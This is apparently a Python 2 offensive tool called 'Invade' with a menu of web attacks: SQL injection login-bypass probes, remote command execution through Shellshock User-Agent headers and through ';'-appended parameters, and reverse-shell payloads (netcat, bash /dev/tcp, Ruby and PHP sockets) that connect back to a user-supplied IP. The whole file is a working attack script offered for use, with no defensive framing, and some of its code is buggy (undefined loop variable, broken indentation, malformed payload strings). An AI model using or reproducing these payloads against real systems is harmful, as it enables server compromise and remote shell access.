#imports
import requests
import os

#print banner
print''' _____                    _
|_   _|                  | |
  | | _ ____   ____ _  __| | ___
  | || '_ \\ \\ / / _` |/ _` |/ _ \\
 _| || | | \\ V / (_| | (_| |  __/
 \\___/_| |_|\\_/ \\__,_|\\__,_|\\___|

 Authors: 3XPL017 & Zchap & TDHU & SodiumHydroxide
 Date created (US format): 11/11/2017
                                 '''
#mainmenu								 
mainmenu='''choices:
	exit
	clear
	[1]show_help
	[2]SQLI 
	[3]typical_shellshock(blind)
	[4]netcat_from_shellshock
	[5]typical_command_injection(blind)
	[6]netcat_from_command_injection\n'''
print(mainmenu)

#define attacks
def SQLI():

    #help
	sqlihelpmenu='''\nchoices:
        [1]show_help
        [2]bypass_login_forms \n'''
	print sqlihelpmenu
	print "SQLI \ntype exit to quit \n"
	#define SQLI functions
	def sqlichoice2():
	
		#take inputs
		user=raw_input("user: ")
		postu=raw_input("post parameter for username: ")
		postp=raw_input("post parameter for password: ")
		print " "

		#check standard responce
		s=requests.post(URL, data={postu:"testuser",postp:"wrongpassword"})

		#SQLI tests
		r=requests.post(URL, data={postu:user+"\'--",postp:"ghghhghhhgh"})
		if s.text != r.text:
			print "potential SQLI detected with "+user+"\'-- as user and any password!"
		r=requests.post(URL, data={postu:user,postp:"\' or ' 1=1"})
		if s.text != r.text:
			print"potential SQLI detected with "+user+" as user and \' or ' 1=1 as password!"

	#get choice
	choice=""
	while choice != "exit":
		choice=raw_input("SQLI: ")
		
	#get URL
	if choice != "exit":
		URL=raw_input("URL: ")
	
        #if choice is help
        if choice == "1":
            print(sqlihelpmenu)

        #if choice is bypass login form
        elif choice == "2":
            sqlichoice2()

def shellshock():
	print "shellshock \ntype exit to quit \n"
	URL=raw_input("URL: ")
	command=""
	while URL != "exit" and command != "exit":
		command=raw_input("command to run: ")
		if URL != "exit" and command != "exit":
			os.system("curl -H \"User-Agent: () { :; }; "+command+"\""+URL)

def netcat_shellshock():
	URL=raw_input("URL: ")
	IP=raw_input("your IP: ")
	PORT=raw_input("PORT: ")
	os.system("curl -H \"User-Agent: () { :; }; nc -e /bin/sh "+IP+" "+PORT+"\""+URL)
	os.system("curl -H \"User-Agent: () { :; }; bash -i >& /dev/tcp/"+IP+"/"+PORT+"0>&1\""+URL)
	os.system("curl -H \"User-Agent: () { :; }; ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\""+URL)
	i=3
	while i < 9:
		i=str(i)
		os.system("curl -H \"User-Agent: () { :; }; php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i+"\");'\""+URL)
		i=int(i)
		i+=1
	print "to see if a reverse shell has opened listen with netcat"
	
def command_injection():
	print "command injection \ntype exit to quit \n"
	URL=raw_input("URL: ")
	command=""
	reqtype=raw_input("request type: ").lower()
	parameter=raw_input("parameter: ")
	while URL != "exit" and command != "exit" and reqtype != "exit":
		command=raw_input("command to run: ")
		if URL != "exit" and command != "exit" and reqtype == "post":
			requests.post(URL, data={parameter:";"+command})
		if URL != "exit" and command != "exit" and reqtype== "get":
			requests.get(URL+"?"+parameter+"=;"+command)
def	netcat_command_injection():	
	URL=raw_input("URL: ")
	reqtype=raw_input("request type: ").lower()
	parameter=raw_input("parameter: ")
	IP=raw_input("your IP: ")
	PORT=raw_input("PORT: ")
	if reqtype == "post":
		requests.post(URL, data={parameter:";nc -e /bin/sh "+IP+" "+PORT})
		requests.post(URL, data={parameter:";bash -i >& /dev/tcp/"+IP+"/"+PORT+"0>&1"})
		requests.post(URL, data={parameter:";ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"})
		while i < 9:
			i=str(i)
			requests.post(URL, data={parameter:";php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i})
			i=int(i)
			i+=1
	if reqtype == "get":
		requests.get(URL+"?"+parameter+"=;nc -e /bin/sh "+IP+" "+PORT)
		requests.get(URL+"?"+parameter+"=;bash -i >& /dev/tcp/"+IP+"/"+PORT+"0>&1")
		requests.get(URL+"?"+parameter+"=;ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
		while i < 9:
			i=str(i)
			requests.get(URL+"?"+parameter+"=;php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i)
			i=int(i)
			i+=1
	print "to see if a reverse shell has opened listen with netcat"
	
#select from mainmenu
while True:
	option=raw_input("main: ")
	if option == "exit":
		exit()
	elif option == "clear":
		os.system("clear")
	elif option == "1" or option == "show_help":
		print(mainmenu)
	elif option == "2" or option == "SQLI":
		SQLI()
	elif option == "3" or option == "typical_shellshock":
		shellshock()
	elif option == "4" or option == "netcat_from_shellshock":
		netcat_shellshock()
	elif option == "5" or option == "typical_command_injection":
		command_injection()	
	elif option == "6" or option == "netcat_from_command_injection":
		netcat_command_injection()